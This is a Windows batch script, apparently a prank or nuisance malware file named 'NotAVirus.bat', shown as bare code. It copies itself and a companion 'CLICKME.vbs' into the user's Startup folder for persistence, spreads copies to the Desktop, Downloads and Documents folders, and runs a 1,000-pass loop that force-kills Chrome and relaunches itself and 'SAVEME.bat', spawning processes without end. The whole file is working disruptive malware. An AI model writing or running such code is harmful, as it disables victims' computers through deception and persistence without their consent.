copy "%USERPROFILE%\Desktop\NotAVirus.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
copy "%USERPROFILE%\Downloads\NotAVirus.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
copy "%USERPROFILE%\Documents\NotAVirus.bat" "%USERPROFILE%\Start Menu\Programs\Startup"
copy "%USERPROFILE%\Desktop\CLICKME.vbs" "%USERPROFILE%\Start Menu\Programs\Startup"
copy "%USERPROFILE%\Downloads\CLICKME.vbs" "%USERPROFILE%\Start Menu\Programs\Startup"
copy "%USERPROFILE%\Documents\CLICKME.vbs" "%USERPROFILE%\Start Menu\Programs\Startup"
copy "%USERPROFILE%\Start Menu\Programs\Startup\CLICKME.vbs" "%USERPROFILE%\Documents"
copy "%USERPROFILE%\Start Menu\Programs\Startup\CLICKME.vbs" "%USERPROFILE%\Downloads"
copy "%USERPROFILE%\Start Menu\Programs\Startup\CLICKME.vbs" "%USERPROFILE%\Desktop"
copy "%USERPROFILE%\Start Menu\Programs\Startup\NotAVirus.bat" "%USERPROFILE%\Documents"
copy "%USERPROFILE%\Start Menu\Programs\Startup\NotAVirus.bat" "%USERPROFILE%\Downloads"
copy "%USERPROFILE%\Start Menu\Programs\Startup\NotAVirus.bat" "%USERPROFILE%\Desktop"
for /L %%A in (1,1,1000) DO (
taskkill /F /IM chrome.exe /T > nul
timeout /t 5 /nobreak
NotAVirus.bat
SAVEME.bat
)
NotAVirus.bat
SAVEME.bat